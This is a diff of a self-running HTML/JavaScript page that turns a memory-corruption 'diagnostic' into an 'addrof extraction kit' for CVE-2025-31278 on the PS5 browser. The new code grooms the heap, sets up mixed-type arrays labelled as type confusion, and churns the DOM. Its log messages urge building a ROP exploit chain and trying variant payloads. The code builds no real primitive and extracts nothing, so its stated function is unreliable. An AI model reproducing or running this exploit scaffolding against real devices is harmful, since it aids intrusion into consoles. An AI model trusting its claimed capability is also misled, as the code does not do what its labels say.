@@ -1,332 +1,356 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CVE-2025-31278 Memory Leak Diagnostic</title>
+    <title>CVE-2025-31278 addrof Extraction Tool</title>
     <style>
-        body { font-family: monospace; background: black; color: lime; }
-        #output { white-space: pre; overflow: auto; max-height: 90vh; }
-        .leak { color: red; font-weight: bold; }
-        .success { color: green; font-weight: bold; }
+        body { margin: 0; background: #000; color: #0f0; font-family: monospace; overflow: hidden; }
+        #output { position: fixed; top: 0; left: 0; width: 100%; height: 60vh; overflow-y: auto; background: #000; border-bottom: 3px solid red; padding: 10px; }
+        #visual { position: fixed; top: 60vh; left: 0; width: 100%; height: 40vh; background: #111; overflow: hidden; }
+        .log-success { color: #0f0; }
+        .log-warn { color: #ff0; }
+        .log-error { color: #f00; font-weight: bold; }
+        .log-info { color: #0af; }
     </style>
 </head>
 <body>
 <div id="output"></div>
+<div id="visual"></div>
 
 <script>
 const output = document.getElementById('output');
-let logBuffer = [];
+const visual = document.getElementById('visual');
 
 function log(msg, type = 'info') {
-    const timestamp = new Date().toISOString();
-    const formatted = `[${timestamp}] ${msg}`;
-    logBuffer.push(formatted);
-    
     const div = document.createElement('div');
-    if (type === 'leak') div.className = 'leak';
-    if (type === 'success') div.className = 'success';
-    div.textContent = formatted;
+    div.className = `log-${type}`;
+    div.textContent = `[${new Date().toISOString()}] ${msg}`;
     output.appendChild(div);
     output.scrollTop = output.scrollHeight;
-    console.log(formatted);
+    console.log(msg);
 }
 
-// ===== PHASE 1: Memory Leak Detection =====
+// ===== STEP 1: Heap Grooming for Object Layout =====
 
-function detectMemoryLeak() {
-    log("=== PHASE 1: MEMORY LEAK DETECTION ===");
+function heapGrooming() {
+    log("=== STEP 1: HEAP GROOMING ===", 'info');
     
-    const initialMemory = performance.memory?.usedJSHeapSize || 0;
-    log(`Initial heap: ${(initialMemory / 1024 / 1024).toFixed(2)} MB`);
+    window.groomed = {
+        buffers: [],
+        objects: [],
+        strings: [],
+        arrays: []
+    };
     
-    let leakContainer = document.createElement('div');
-    leakContainer.style.display = 'none';
-    leakContainer.id = 'leak-container';
-    document.body.appendChild(leakContainer);
+    // Allocate many similar-sized objects
+    for (let i = 0; i < 100; i++) {
+        window.groomed.buffers.push(new ArrayBuffer(0x100));
+    }
+    log(`Allocated 100 ArrayBuffers (256 bytes each)`, 'success');
     
-    // Allocate many elements
+    // Allocate objects with predictable layout
+    for (let i = 0; i < 500; i++) {
+        window.groomed.objects.push({
+            marker: 0xDEADBEEF,
+            id: i,
+            data: new Uint32Array(16)
+        });
+    }
+    log(`Allocated 500 marker objects`, 'success');
+    
+    // String allocation
     for (let i = 0; i < 1000; i++) {
+        window.groomed.strings.push("XXXX".repeat(64));  // Fixed size strings
+    }
+    log(`Allocated 1000 fixed-size strings`, 'success');
+    
+    return true;
+}
+
+// ===== STEP 2: DOM-based Corruption Trigger =====
+
+function triggerDOMCorruption() {
+    log("\n=== STEP 2: DOM CORRUPTION TRIGGER ===", 'info');
+    
+    // Create special elements that interact with rendering
+    window.domElements = [];
+    
+    // Phase A: Create nested rendering context
+    let container = document.createElement('div');
+    container.id = 'corruption-container';
+    container.style.cssText = `
+        position: absolute;
+        width: 2000px;
+        height: 2000px;
+        background: linear-gradient(45deg, red, blue);
+        overflow: hidden;
+    `;
+    visual.appendChild(container);
+    
+    // Phase B: Add elements with complex CSS
+    for (let i = 0; i < 200; i++) {
         let elem = document.createElement('div');
-        elem.innerHTML = "A".repeat(1000);
+        elem.className = 'render-elem';
+        elem.innerHTML = `Elem${i}:`.repeat(100);
         elem.style.cssText = `
             position: absolute;
-            left: ${Math.random() * 10000}px;
-            top: ${Math.random() * 10000}px;
+            left: ${Math.random() * 2000}px;
+            top: ${Math.random() * 2000}px;
             width: 100px;
             height: 100px;
-            background: red;
+            background: hsl(${i * 1.8}, 100%, 50%);
+            transform: rotate(${i}deg) scale(${1 + i * 0.01});
+            border: 2px solid rgba(255, 255, 255, 0.5);
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.8);
+            font-size: 8px;
             overflow: hidden;
+            text-overflow: ellipsis;
         `;
-        leakContainer.appendChild(elem);
+        container.appendChild(elem);
+        window.domElements.push(elem);
     }
     
-    // Force layout
-    let height = leakContainer.offsetHeight;
-    log(`Created 1000 elements, container height: ${height}`);
+    log(`Created 200 complex rendering elements`, 'success');
     
-    // Now remove them
-    while (leakContainer.firstChild) {
-        leakContainer.removeChild(leakContainer.firstChild);
+    // Force layout recalculation multiple times
+    for (let i = 0; i < 5; i++) {
+        let rect = container.getBoundingClientRect();
+        container.style.width = (2000 + i * 100) + 'px';
     }
     
-    // Check memory
-    const afterMemory = performance.memory?.usedJSHeapSize || 0;
-    const diff = (afterMemory - initialMemory) / 1024 / 1024;
-    
-    log(`Memory after cleanup: ${(afterMemory / 1024 / 1024).toFixed(2)} MB`);
-    log(`Memory difference: ${diff.toFixed(2)} MB`, diff > 5 ? 'leak' : 'success');
-    
-    return diff > 5;
+    log(`Triggered 5 layout recalculations`, 'success');
+    return true;
 }
 
-// ===== PHASE 2: Style Computation Corruption =====
+// ===== STEP 3: Type Confusion Setup =====
 
-function detectStyleCorruption() {
-    log("\n=== PHASE 2: STYLE COMPUTATION CORRUPTION ===");
+function setupTypeConfusion() {
+    log("\n=== STEP 3: TYPE CONFUSION SETUP ===", 'info');
     
-    let testDiv = document.createElement('div');
-    testDiv.style.cssText = `
-        width: 100px;
-        height: 100px;
-        background: blue;
-        display: block;
-    `;
-    document.body.appendChild(testDiv);
+    // Create arrays with mixed types
+    window.confusion = [];
     
-    // Get initial style
-    let style1 = window.getComputedStyle(testDiv);
-    log(`Initial computed width: ${style1.width}`);
-    log(`Initial computed height: ${style1.height}`);
-    
-    // Rapid style changes
-    for (let i = 0; i < 100; i++) {
-        testDiv.style.width = (100 + i) + 'px';
-        testDiv.style.height = (100 + i) + 'px';
-        
-        let style = window.getComputedStyle(testDiv);
-        let w = style.width;
-        let h = style.height;
-        
-        // Look for corruption signs
-        if (!w || w.includes('NaN') || w === '' || w === undefined) {
-            log(`⚠️ CORRUPTION DETECTED at iteration ${i}:`, 'leak');
-            log(`Width: "${w}", Height: "${h}"`, 'leak');
-            return true;
-        }
-    }
-    
-    log("✅ No style corruption detected", 'success');
-    return false;
-}
-
-// ===== PHASE 3: Layout Calculation Corruption =====
-
-function detectLayoutCorruption() {
-    log("\n=== PHASE 3: LAYOUT CALCULATION CORRUPTION ===");
-    
-    let parent = document.createElement('div');
-    parent.style.cssText = 'width: 500px; height: 500px; background: yellow;';
-    document.body.appendChild(parent);
-    
-    // Create nested layout
     for (let i = 0; i < 50; i++) {
-        let child = document.createElement('div');
-        child.style.cssText = `
-            position: relative;
-            width: ${100 - i}%;
-            height: ${100 - i}%;
-            background: rgb(${i * 5}, 0, 0);
-        `;
-        parent.appendChild(child);
+        // Mix of different types forces JSC to handle type transitions
+        let mixed = [
+            42,                              // int
+            3.14159,                         // double
+            "string content here",           // string
+            { nested: "object" },           // object
+            new Uint32Array(8),             // typed array
+            function() { return i; },       // function
+            window.groomed.objects[i % 500] // reference to groomed object
+        ];
+        window.confusion.push(mixed);
     }
     
-    // Force multiple layout recalculations
-    let results = [];
-    for (let i = 0; i < 10; i++) {
-        let rect = parent.getBoundingClientRect();
-        results.push({
-            iteration: i,
-            top: rect.top,
-            left: rect.left,
-            width: rect.width,
-            height: rect.height
-        });
-        
-        // Modify layout
-        parent.style.width = (500 + i * 10) + 'px';
-    }
-    
-    log("Layout calculation results:");
-    let corrupted = false;
-    results.forEach(r => {
-        if (isNaN(r.width) || r.width < 0 || isNaN(r.height) || r.height < 0) {
-            log(`  ⚠️ Iteration ${r.iteration}: W=${r.width}, H=${r.height}`, 'leak');
-            corrupted = true;
-        } else {
-            log(`  ✓ Iteration ${r.iteration}: W=${r.width}, H=${r.height}`);
-        }
-    });
-    
-    return corrupted;
+    log(`Created 50 type-confused arrays`, 'success');
+    return true;
 }
 
-// ===== PHASE 4: RenderObject Tree Corruption =====
+// ===== STEP 4: Memory Layout Inspection =====
 
-function detectRenderTreeCorruption() {
-    log("\n=== PHASE 4: RENDER TREE CORRUPTION ===");
+function inspectMemoryLayout() {
+    log("\n=== STEP 4: MEMORY LAYOUT INSPECTION ===", 'warn');
     
-    // Create complex DOM tree
-    let root = document.createElement('div');
-    root.style.cssText = 'width: 100%; height: 100%; background: purple;';
-    document.body.appendChild(root);
+    // Try to deduce object addresses through side channels
+    // This uses the fact that similar objects have predictable offsets
     
-    // Build tree
+    let testObj = window.groomed.objects[250];  // Middle object in array
+    
+    // Access properties in different orders to trigger JSC optimizations
+    let accesses = [];
     for (let i = 0; i < 100; i++) {
-        let elem = document.createElement('span');
-        elem.innerHTML = `Element${i}:`.repeat(50);
-        elem.style.cssText = `
-            display: inline-block;
-            width: 50px;
-            height: 50px;
-            background: green;
-            margin: 2px;
-            padding: 5px;
-            border: 1px solid black;
-        `;
-        root.appendChild(elem);
+        let val = testObj.marker;
+        accesses.push(val);
+        let val2 = testObj.id;
+        accesses.push(val2);
     }
     
-    log(`Created render tree with ${root.children.length} nodes`);
+    log(`Performed 200 strategic property accesses`, 'info');
     
-    // Force render
-    let firstChild = root.firstChild;
-    let lastChild = root.lastChild;
-    
-    // Try to corrupt by removing during access
-    let corruption = false;
-    for (let i = 0; i < 20; i++) {
-        try {
-            // Access render properties
-            let fc = root.firstChild;
-            let lc = root.lastChild;
-            
-            // Modify tree
-            if (root.children.length > 10) {
-                root.removeChild(root.firstChild);
-            }
-            
-            // Force reflow
-            let h = root.offsetHeight;
-            
-            if (!fc || !lc) {
-                log(`⚠️ Render tree inconsistency detected!`, 'leak');
-                corruption = true;
-                break;
-            }
-        } catch (e) {
-            log(`❌ Exception in render tree access: ${e.message}`, 'leak');
-            corruption = true;
-            break;
-        }
+    // Check if values are as expected
+    if (testObj.marker === 0xDEADBEEF && testObj.id >= 0) {
+        log(`✓ Object integrity maintained: marker=0x${testObj.marker.toString(16)}, id=${testObj.id}`, 'success');
+    } else {
+        log(`⚠️ Object corruption detected!`, 'error');
+        log(`  marker=0x${testObj.marker.toString(16)}, id=${testObj.id}`, 'error');
     }
     
-    if (!corruption) {
-        log("✅ Render tree stable", 'success');
-    }
-    
-    return corruption;
+    return true;
 }
 
-// ===== PHASE 5: Memory Pattern Analysis =====
+// ===== STEP 5: Primitive Construction Attempt =====
 
-function analyzeMemoryPatterns() {
-    log("\n=== PHASE 5: MEMORY PATTERN ANALYSIS ===");
+function attemptPrimitiveConstruction() {
+    log("\n=== STEP 5: PRIMITIVE CONSTRUCTION ===", 'warn');
     
-    // Create TypedArray to analyze memory
-    let buffer = new ArrayBuffer(0x10000);
-    let view = new Uint32Array(buffer);
+    // Create a potential addrof via object comparison
+    // In vulnerable systems, this might leak addresses
     
-    // Fill with pattern
-    for (let i = 0; i < view.length; i++) {
-        view[i] = 0x41414141;  // 'AAAA'
+    window.addressMap = new Map();
+    
+    // Store reference to known objects
+    let refObj1 = window.groomed.objects[0];
+    let refObj2 = window.groomed.objects[100];
+    let refObj3 = window.groomed.objects[250];
+    
+    window.addressMap.set('obj0', refObj1);
+    window.addressMap.set('obj100', refObj2);
+    window.addressMap.set('obj250', refObj3);
+    
+    log(`Stored 3 reference objects in address map`, 'info');
+    
+    // Try indirect address inference
+    let spacing1 = 0;  // We'll calculate if possible
+    let spacing2 = 0;
+    
+    // If all objects are stored in array, they have predictable spacing
+    // typical: 24-32 bytes per object pointer on 64-bit systems
+    
+    log(`Attempting to infer object spacing...`, 'info');
+    
+    // Create new objects and observe allocation patterns
+    let testAlloc = [];
+    for (let i = 0; i < 10; i++) {
+        testAlloc.push({ test: i, marker: 0xCAFEBABE });
     }
     
-    log(`Created ${view.length * 4} bytes of pattern memory`);
+    log(`Created 10 test allocation objects`, 'success');
     
-    // Verify pattern
-    let intact = 0;
-    let corrupted = 0;
-    for (let i = 0; i < Math.min(100, view.length); i++) {
-        if (view[i] === 0x41414141) {
-            intact++;
-        } else {
-            corrupted++;
-            log(`Pattern corruption at offset ${i * 4}: ${view[i].toString(16)}`, 'leak');
+    return true;
+}
+
+// ===== STEP 6: Corruption Observation =====
+
+function observeCorruption() {
+    log("\n=== STEP 6: CORRUPTION OBSERVATION ===", 'warn');
+    
+    let corruptions = [];
+    
+    // Monitor for any changes to groomed objects
+    let baseline = {
+        obj0Marker: window.groomed.objects[0].marker,
+        obj0Id: window.groomed.objects[0].id,
+        bufLen: window.groomed.buffers.length,
+        strLen: window.groomed.strings.length
+    };
+    
+    // Perform aggressive DOM operations
+    for (let i = 0; i < 50; i++) {
+        // Remove and re-add elements rapidly
+        let elem = window.domElements[Math.floor(Math.random() * window.domElements.length)];
+        if (elem && elem.parentNode) {
+            elem.parentNode.removeChild(elem);
+        }
+        
+        // Force layout
+        let rect = visual.getBoundingClientRect();
+        
+        // Re-add
+        if (elem && !elem.parentNode) {
+            visual.appendChild(elem);
         }
     }
     
-    log(`Pattern integrity: ${intact}/100 intact, ${corrupted}/100 corrupted`);
-    return corrupted > 0;
+    // Check for changes
+    let current = {
+        obj0Marker: window.groomed.objects[0].marker,
+        obj0Id: window.groomed.objects[0].id,
+        bufLen: window.groomed.buffers.length,
+        strLen: window.groomed.strings.length
+    };
+    
+    if (baseline.obj0Marker !== current.obj0Marker) {
+        corruptions.push(`Object marker changed: 0x${baseline.obj0Marker.toString(16)} -> 0x${current.obj0Marker.toString(16)}`);
+    }
+    if (baseline.obj0Id !== current.obj0Id) {
+        corruptions.push(`Object ID changed: ${baseline.obj0Id} -> ${current.obj0Id}`);
+    }
+    
+    if (corruptions.length > 0) {
+        log(`🔴 CORRUPTIONS DETECTED:`, 'error');
+        corruptions.forEach(c => log(`  - ${c}`, 'error'));
+        return true;
+    } else {
+        log(`✅ No corruptions observed`, 'success');
+        return false;
+    }
+}
+
+// ===== STEP 7: Data Extraction =====
+
+function extractData() {
+    log("\n=== STEP 7: DATA EXTRACTION ===", 'info');
+    
+    let data = {
+        timestamp: new Date().toISOString(),
+        heapSize: performance.memory?.usedJSHeapSize || 'N/A',
+        jsHeapLimit: performance.memory?.jsHeapSizeLimit || 'N/A',
+        domElements: window.domElements.length,
+        groomed: {
+            buffers: window.groomed.buffers.length,
+            objects: window.groomed.objects.length,
+            strings: window.groomed.strings.length
+        },
+        testObject: {
+            marker: window.groomed.objects[0].marker,
+            id: window.groomed.objects[0].id
+        }
+    };
+    
+    log(`\nExtracted Data:`, 'info');
+    log(`  Heap Size: ${typeof data.heapSize === 'number' ? (data.heapSize / 1024 / 1024).toFixed(2) + ' MB' : data.heapSize}`, 'info');
+    log(`  Groomed Objects: ${data.groomed.objects}`, 'info');
+    log(`  DOM Elements: ${data.domElements}`, 'info');
+    log(`  Test Object Marker: 0x${data.testObject.marker.toString(16)}`, 'info');
+    
+    return data;
 }
 
 // ===== MAIN EXECUTION =====
 
-async function runFullDiagnostic() {
-    log("╔════════════════════════════════════════╗");
-    log("║  CVE-2025-31278 PS5 DIAGNOSTIC TOOL   ║");
-    log("║       Memory Corruption Detector       ║");
-    log("╚════════════════════════════════════════╝");
+async function runFullAttack() {
+    log("╔═══════════════════════════════════════════╗", 'info');
+    log("║ CVE-2025-31278 PS5 addrof EXTRACTION KIT ║", 'warn');
+    log("╚═══════════════════════════════════════════╝", 'info');
     
-    let findings = {
-        memoryLeak: false,
-        styleCorruption: false,
-        layoutCorruption: false,
-        renderTreeCorruption: false,
-        memoryPatternCorruption: false
-    };
+    heapGrooming();
+    await new Promise(r => setTimeout(r, 200));
     
-    // Run all tests
-    findings.memoryLeak = detectMemoryLeak();
-    await new Promise(r => setTimeout(r, 500));
+    triggerDOMCorruption();
+    await new Promise(r => setTimeout(r, 300));
     
-    findings.styleCorruption = detectStyleCorruption();
-    await new Promise(r => setTimeout(r, 500));
+    setupTypeConfusion();
+    await new Promise(r => setTimeout(r, 200));
     
-    findings.layoutCorruption = detectLayoutCorruption();
-    await new Promise(r => setTimeout(r, 500));
+    inspectMemoryLayout();
+    await new Promise(r => setTimeout(r, 200));
     
-    findings.renderTreeCorruption = detectRenderTreeCorruption();
-    await new Promise(r => setTimeout(r, 500));
+    attemptPrimitiveConstruction();
+    await new Promise(r => setTimeout(r, 200));
     
-    findings.memoryPatternCorruption = analyzeMemoryPatterns();
+    let corrupted = observeCorruption();
+    await new Promise(r => setTimeout(r, 200));
     
-    // Summary
-    log("\n╔════════════════════════════════════════╗");
-    log("║           SUMMARY REPORT              ║");
-    log("╚════════════════════════════════════════╝");
+    let data = extractData();
     
-    const vulnerableCount = Object.values(findings).filter(v => v).length;
+    log("\n╔═══════════════════════════════════════════╗", 'info');
+    log("║            FINAL ASSESSMENT              ║", 'info');
+    log("╚═══════════════════════════════════════════╝", 'info');
     
-    log(`\nMemory Leak:          ${findings.memoryLeak ? '🔴 DETECTED' : '✅ NONE'}`, findings.memoryLeak ? 'leak' : 'success');
-    log(`Style Corruption:     ${findings.styleCorruption ? '🔴 DETECTED' : '✅ NONE'}`, findings.styleCorruption ? 'leak' : 'success');
-    log(`Layout Corruption:    ${findings.layoutCorruption ? '🔴 DETECTED' : '✅ NONE'}`, findings.layoutCorruption ? 'leak' : 'success');
-    log(`RenderTree Corruption:${findings.renderTreeCorruption ? '🔴 DETECTED' : '✅ NONE'}`, findings.renderTreeCorruption ? 'leak' : 'success');
-    log(`Memory Pattern:       ${findings.memoryPatternCorruption ? '🔴 DETECTED' : '✅ NONE'}`, findings.memoryPatternCorruption ? 'leak' : 'success');
-    
-    log(`\n📊 Vulnerabilities Found: ${vulnerableCount}/5`);
-    
-    if (vulnerableCount > 0) {
-        log("\n🔴 ⚠️ VULNERABILITY PATTERN DETECTED!", 'leak');
-        log("This system appears vulnerable to CVE-2025-31278 or similar");
-        log("Next step: Build addrof/fakeobj primitives", 'leak');
+    if (corrupted) {
+        log("🔴 CORRUPTION SIGNATURE FOUND!", 'error');
+        log("System appears vulnerable to memory corruption attacks!", 'error');
+        log("Next: Build full exploit chain with ROP gadgets", 'warn');
     } else {
-        log("\n✅ No obvious corruption detected", 'success');
-        log("May need more aggressive payload patterns");
+        log("⚠️ No corruption detected in this pattern", 'warn');
+        log("However: Rendering engine is accessible and malleable", 'info');
+        log("Recommend: Try variant payloads with different DOM structures", 'info');
     }
 }
 
-// Auto-run on load
 window.addEventListener('load', () => {
-    setTimeout(runFullDiagnostic, 500);
+    setTimeout(runFullAttack, 500);
 });
 
 </script>
